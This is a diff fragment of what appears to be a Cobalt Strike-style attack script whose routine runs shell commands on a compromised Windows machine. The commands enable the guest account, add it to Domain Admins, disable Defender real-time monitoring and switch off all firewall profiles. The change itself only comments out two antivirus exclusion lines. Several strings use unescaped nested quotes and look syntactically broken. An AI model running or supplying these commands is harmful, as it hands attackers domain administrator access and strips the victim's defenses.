@@ -12,8 +12,8 @@ sub stuffToDo {
 	bshell($1, "net user guest active:yes");
   bshell($1, "net group "Domain Admins" guest");
   bshell($1, "Set-MpPreference -DisableRealtimeMonitoring $true");
-  bshell($1, "Set-MpPreference -ExclusionProcess "roblox.exe", "minecraft.exe"");
-  bshell($1, "Add-MpPreference -ExclusionPath C:\");
+  #bshell($1, "Set-MpPreference -ExclusionProcess "roblox.exe", "minecraft.exe"");
+  #bshell($1, "Add-MpPreference -ExclusionPath C:\");
   bshell($1, "Netsh Advfirewall show allprofiles");
   bshell($1, "NetSh Advfirewall set allprofiles state off");
   bshell($1, "net group "Domain Admins" guest");
